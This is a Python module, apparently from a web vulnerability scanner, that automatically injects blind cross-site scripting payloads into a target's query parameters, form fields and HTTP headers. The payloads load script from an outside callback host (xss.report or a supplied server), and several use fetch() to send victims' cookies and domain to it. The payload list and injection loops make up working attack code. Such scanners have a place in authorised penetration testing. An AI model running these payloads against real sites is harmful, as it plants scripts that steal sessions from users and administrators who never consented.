"""Blind XSS Scanner — inject callback payloads for out-of-band XSS detection."""

import aiohttp
import asyncio
import uuid
import time
from urllib.parse import urlparse, urlencode
from modules.core import console

BLIND_XSS_PAYLOADS = [
    '"><script src=https://xss.report/s/{callback_id}></script>',
    "'><script src=https://xss.report/s/{callback_id}></script>",
    '"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://xss.report/s/{callback_id}\';document.head.appendChild(s)">',
    '<script>fetch("https://xss.report/s/{callback_id}?c="+document.cookie)</script>',
    '"><svg onload="fetch(\'https://xss.report/s/{callback_id}?d=\'+document.domain)">',
    "javascript:fetch('https://xss.report/s/{callback_id}?c='+document.cookie)",
    '{{constructor.constructor("fetch(\'https://xss.report/s/{callback_id}\')")()}}',
    '<details open ontoggle="fetch(\'https://xss.report/s/{callback_id}\')">',
    '<iframe srcdoc="<script>fetch(\'https://xss.report/s/{callback_id}\')</script>">',
    '<object data="javascript:fetch(\'https://xss.report/s/{callback_id}\')">',
]

INJECTION_POINTS = [
    'name', 'email', 'username', 'comment', 'message', 'feedback',
    'q', 'search', 'query', 'input', 'text', 'title', 'subject',
    'body', 'content', 'description', 'url', 'redirect', 'next',
    'callback', 'return', 'ref', 'referer', 'user-agent', 'contact',
]

HEADER_INJECTION = [
    'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host',
    'Origin', 'Accept-Language', 'Cookie',
]


async def _inject_params(session, url, callback_id):
    """Inject blind XSS payloads via GET/POST parameters."""
    findings = []

    for param in INJECTION_POINTS:
        for payload_tpl in BLIND_XSS_PAYLOADS[:3]:
            payload = payload_tpl.format(callback_id=callback_id)
            try:
                params = {param: payload}
                async with session.get(url, params=params,
                                       timeout=aiohttp.ClientTimeout(total=8),
                                       ssl=False) as resp:
                    body = await resp.text()
                    if payload[:20] in body:
                        findings.append({
                            'type': 'Blind XSS Payload Reflected',
                            'param': param,
                            'method': 'GET',
                            'severity': 'High',
                            'callback': callback_id,
                        })
            except Exception:
                pass

            try:
                data = {param: payload}
                async with session.post(url, data=data,
                                        timeout=aiohttp.ClientTimeout(total=8),
                                        ssl=False) as resp:
                    body = await resp.text()
                    if payload[:20] in body:
                        findings.append({
                            'type': 'Blind XSS Payload Reflected (POST)',
                            'param': param,
                            'method': 'POST',
                            'severity': 'High',
                            'callback': callback_id,
                        })
            except Exception:
                pass

    return findings


async def _inject_headers(session, url, callback_id):
    """Inject blind XSS payloads via HTTP headers."""
    findings = []

    for header in HEADER_INJECTION:
        payload = BLIND_XSS_PAYLOADS[0].format(callback_id=callback_id)
        try:
            headers = {header: payload}
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=8),
                                   ssl=False) as resp:
                body = await resp.text()
                if payload[:20] in body:
                    findings.append({
                        'type': 'Blind XSS Header Reflection',
                        'header': header,
                        'severity': 'High',
                        'callback': callback_id,
                    })
        except Exception:
            pass

    return findings


async def scan_blind_xss(session, url, callback_server=None):
    """Scan for blind XSS vulnerabilities with callback payloads."""
    console.print(f"\n[bold cyan]--- Blind XSS Scanner ---[/bold cyan]")

    callback_id = str(uuid.uuid4())[:8]

    if callback_server:
        for i, p in enumerate(BLIND_XSS_PAYLOADS):
            BLIND_XSS_PAYLOADS[i] = p.replace('https://xss.report/s/', callback_server.rstrip('/') + '/')

    console.print(f"  [dim]Callback ID: {callback_id}[/dim]")
    console.print(f"  [cyan]Injecting {len(BLIND_XSS_PAYLOADS)} payloads × {len(INJECTION_POINTS)} params...[/cyan]")

    all_findings = []

    param_findings = await _inject_params(session, url, callback_id)
    all_findings.extend(param_findings)

    console.print(f"  [cyan]Testing {len(HEADER_INJECTION)} header injection points...[/cyan]")
    header_findings = await _inject_headers(session, url, callback_id)
    all_findings.extend(header_findings)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} blind XSS injections reflected![/bold red]")
        for f in all_findings:
            console.print(f"  [red]⚠ {f['type']}: {f.get('param', f.get('header', ''))}[/red]")
        console.print(f"\n  [yellow]Check your callback server for out-of-band executions[/yellow]")
        console.print(f"  [dim]Callback ID: {callback_id}[/dim]")
    else:
        console.print(f"\n  [green]✓ No blind XSS reflections detected[/green]")
        console.print(f"  [dim]Payloads injected — check callback server later for delayed triggers[/dim]")

    return {
        'callback_id': callback_id,
        'findings': all_findings,
        'injections_sent': len(INJECTION_POINTS) * 3 + len(HEADER_INJECTION),
    }
